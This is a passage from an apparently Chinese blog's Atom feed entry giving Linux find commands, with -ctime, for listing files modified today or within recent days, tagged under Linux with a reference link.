查看被修改过的文件"></a>0x04 查看被<code>修改</code>过的文件</h4><h6 id="1-今天被访问的文件-1"><a href="#1-今天被访问的文件-1" class="headerlink" title="1 今天被访问的文件"></a>1 今天被访问的文件</h6><p><code>find /home -ctime 0  #查看home 目录下今天被修改过的文件</code></p><h6 id="2-查看几天之内被访问的文件-1"><a href="#2-查看几天之内被访问的文件-1" class="headerlink" title="2 查看几天之内被访问的文件"></a>2 查看几天之内被访问的文件</h6><p><code>find . -ctime +2  # -ctime n,  File  was last changed n*24 hours ago.；查看当前目录三天之内被修改过的文件</code></p><h4 id="0x05-更多查看文件的用法"><a href="#0x05-更多查看文件的用法" class="headerlink" title="0x05 更多查看文件的用法"></a>0x05 更多查看文件的用法</h4><p>… …</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参考：&lt;a href=&quot;http://www.hackdig.com/01/hack-42547.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.hackdig.com/01/hack-42547.htm&lt;/a&gt;&lt;/p&gt;
&lt;h4
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
  </entry>
  
</feed>
